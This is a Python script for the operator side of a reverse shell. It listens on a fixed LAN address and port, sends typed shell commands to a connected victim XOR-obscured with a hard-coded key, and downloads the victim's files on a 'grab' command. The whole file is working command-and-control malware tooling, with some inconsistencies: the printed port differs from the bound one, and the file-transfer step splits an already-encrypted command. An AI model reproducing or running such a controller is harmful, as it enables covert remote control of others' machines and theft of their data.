import os
import socket
import string
import random
 
def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split("*")
    f = open('/root/Desktop/'+path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4]) # Write those last received bits without the word 'DONE' 
            f.close()
            print ('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print ('[-] Unable to find out the file')
            break
        f.write(bits)
def str_xor(s1, s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1,s2)])
def connecting():
    s = socket.socket()
    s.bind(("192.168.1.147", 7174))
    s.listen(1)
    print('[+] Listening for income TCP connection on port 8080\n')
    # key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!$%&()=?{[]}+~#-_.:,;<>|') for _ in range(0, 1024))
    key = '''kKx^R.6c,]^w)phJ<YPP|s:f[S1i)(<{~R8D$q+O3=sD1k_zd3=D--(|pH}^qSA4Im-R}kh-t5-CSQnZ5BK#;)K%<bA~w=3>T6UVAPS0BMzd<}ZuSgOZt?~b=[+k3d.97C_$GyG$X2%[iwXGF.qLCP_CG=wC,t%M9n%.LIv&tUSn44Jt;LO9;Cr{N]UCVQk}[hTOTbK5)U7-HAEw|s96dz93##u7hloC-NGA[SNYt$Af-Y87,n~VggnyQP%fA?&E2QI,KNdMin6Q90zm#k]Wsb9KRx_ONoubRXqd;7]KTh09VO&776o6xpi9U>bly2eVjulVi]u8Ck#hCP&a&TLK:MB5Y%Yqf38WhiO$U!JkbZ+XpvOLlR!0y5SC[_by6T9R!Wb4C3ocj+0o^$e3[0o69fE!1V|mC}RLa1573C:rteaFzqVb4NyucJ+8z7I~y89|oxR<lyK9{72PU_qD3adm?0#qwL-3Foa6bj%wg_Pk_z:AuHKo!A#5XvEPiraP#Qh>+-V&Y,YWY0qfmw0SUr7jzi{_ZMY<V%FIUS4w.pV,Z;S&f{n:,K5~ZA.u5!W]aqq!VwxAM;}}.5peZGseIg|?IKGHXu^KNtHnxgR0pTi_,>3^03+:.^G$J_DJYYAn?SB(,dsFs+9A5[7#Qq~2m,^^~US(YX-t$xOYI[CY&y<q8Zn(^g4U$7YgX0jO4B<Qs#CDC)Zi6ywjZLb3afo8Zk%]c%7MzqDgE(26,Fd_&%LA0nRpyB%%<ymz#_]N#3(&AkMrYCkzfl-5WU~KwAO<:Rsm!gIN80qa5;oh!~L_nm8QRN=5A8F?>U=LRy=S!JKtgil_a)D{4|;X4S$v|~;W#zmJ1RQ<b>zIuNAt%P-8^N.$Irm9$E^05y<ds.m=3wj|yYy,szu9fV-It[ZUI2=7q4&|3a}5NBu>s<j^w--0BzqZCkBzcIjeUi7rf<f27o9?j2sxtfVZj&QNf)yp,55o4[ydLxxROY+ML&KXM#K&zEiPI,^^8;aiw~7UaJ(mN0Mkp5I2'''
    print(key)
    print ("\n" + "Key length = " + str(len(key)))
    conn, addr = s.accept()
    print('[+]We got a connection from', addr)
    while True:
        command = input("Shell> ")
        enc = str_xor(command, key)
        print("Encrypted command is " + "\n" + enc + "\n")
        if 'terminate' in command:
            conn.send(enc.encode())
            break
        elif 'grab' in command:
            transfer(conn, enc)
        else:
            conn.send(enc.encode())
            print(conn.recv(1024).decode())
def main():
    connecting()
main()
 
